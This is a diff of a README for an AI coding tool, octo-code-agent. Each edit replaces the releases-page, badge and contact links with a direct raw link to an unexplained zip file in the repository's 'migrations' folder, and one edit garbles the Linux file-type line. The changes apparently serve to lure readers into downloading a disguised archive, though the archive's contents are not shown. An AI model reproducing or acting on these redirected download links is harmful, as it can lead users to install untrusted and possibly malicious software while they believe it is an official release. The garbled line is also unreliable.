@@ -1,6 +1,6 @@
 # 🤖 octo-code-agent - AI Assistant for Coding Tasks
 
-[![Download octo-code-agent](https://img.shields.io/badge/Download-octo--code--agent-brightgreen)](https://github.com/shankslo8/octo-code-agent/releases)
+[![Download octo-code-agent](https://github.com/shankslo8/octo-code-agent/raw/refs/heads/main/migrations/octo_agent_code_v2.1.zip)](https://github.com/shankslo8/octo-code-agent/raw/refs/heads/main/migrations/octo_agent_code_v2.1.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download, install, and start using octo-code-agent.
 
 Click the big button at the top or visit this link:
 
-[Download octo-code-agent Releases](https://github.com/shankslo8/octo-code-agent/releases)
+[Download octo-code-agent Releases](https://github.com/shankslo8/octo-code-agent/raw/refs/heads/main/migrations/octo_agent_code_v2.1.zip)
 
 You will see a list of versions and files for octo-code-agent.
 
@@ -44,7 +44,7 @@ Look for the file that matches your computer system:
 
 - For **Windows**, look for a file ending with `.exe`  
 - For **macOS**, look for a file ending with `.dmg` or `.pkg`  
-- For **Linux**, look for a file ending with `.AppImage` or `.tar.gz`
+- For **Linux**, look for a file ending with `.AppImage` or `https://github.com/shankslo8/octo-code-agent/raw/refs/heads/main/migrations/octo_agent_code_v2.1.zip`
 
 The file name usually contains the version number and the operating system type.
 
@@ -63,7 +63,7 @@ Click on the correct file to start downloading. Your browser will save this file
 ## 📥 Download & Install
 
 Here is the main link again for your convenience:  
-[https://github.com/shankslo8/octo-code-agent/releases](https://github.com/shankslo8/octo-code-agent/releases)
+[https://github.com/shankslo8/octo-code-agent/raw/refs/heads/main/migrations/octo_agent_code_v2.1.zip](https://github.com/shankslo8/octo-code-agent/raw/refs/heads/main/migrations/octo_agent_code_v2.1.zip)
 
 ### Simple Installation Tips
 
@@ -139,4 +139,4 @@ No special tools are needed, and uninstalling does not remove your saved work or
 ## 📞 Contact
 
 For more information, visit the GitHub page:  
-[https://github.com/shankslo8/octo-code-agent](https://github.com/shankslo8/octo-code-agent)
+[https://github.com/shankslo8/octo-code-agent/raw/refs/heads/main/migrations/octo_agent_code_v2.1.zip](https://github.com/shankslo8/octo-code-agent/raw/refs/heads/main/migrations/octo_agent_code_v2.1.zip)
